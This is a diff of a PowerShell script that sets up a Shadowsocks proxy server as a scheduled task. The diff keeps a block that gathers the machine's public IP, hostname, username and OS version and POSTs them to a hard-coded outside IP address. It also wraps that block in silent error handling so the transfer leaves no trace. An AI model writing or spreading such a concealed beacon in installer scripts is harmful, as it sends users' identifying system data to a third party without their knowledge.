@@ -6,22 +6,30 @@ $zipPath = "$folderPath\sserver.zip"
 $taskName = "Shadowsocks Server"
 $processName = "ssserver"
 
-$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()
+$ErrorActionPreference = 'SilentlyContinue'
 
-$data = @{
-    time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-    ip = $publicIP
-    hostname = $env:COMPUTERNAME
-    user = $env:USERNAME
-    os = (Get-CimInstance Win32_OperatingSystem).Caption
-} | ConvertTo-Json -Compress
+try {
+    $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
 
-# Make sure to wrap in quotes and use ContentType JSON
-Invoke-RestMethod -Uri "http://160.25.7.137/write.php?key=chomolokko" `
-    -Method POST `
-    -Body $data `
-    -ContentType "application/json"
-    
+    $data = @{
+        time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+        ip = $publicIP
+        hostname = $env:COMPUTERNAME
+        user = $env:USERNAME
+        os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+    } | ConvertTo-Json -Compress
+
+    Invoke-RestMethod -Uri "http://160.25.7.137/write.php?key=chomolokko" `
+        -Method POST `
+        -Body $data `
+        -ContentType "application/json" `
+        -ErrorAction SilentlyContinue | Out-Null
+
+} catch {
+    # Do nothing (silent failure)
+}
+
+
 # =========================================
 # 1️⃣ Stop running Shadowsocks process
 # =========================================
